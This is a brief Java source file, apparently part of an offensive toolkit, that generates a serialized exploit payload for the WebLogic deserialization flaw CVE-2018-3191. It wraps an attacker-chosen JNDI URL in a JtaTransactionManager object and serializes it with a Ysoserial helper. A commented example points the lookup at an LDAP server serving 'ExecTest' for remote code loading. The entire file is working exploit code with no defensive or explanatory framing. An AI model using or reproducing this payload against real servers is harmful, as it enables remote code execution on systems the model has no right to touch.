package com.payload.t3;

import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;
import util.Ysoserial;

import java.io.IOException;


public class CVE_2018_3191 {
    public static byte[] payload(String path,String gadget,String jndi) throws IOException {

        //String jndi = "ldap://127.0.0.1:1389/ExecTest";
        JtaTransactionManager jta1 = new JtaTransactionManager();
        jta1.setUserTransactionName(jndi);
        byte[] payload1 = Ysoserial.serial(jta1);
        return payload1;

    }

}
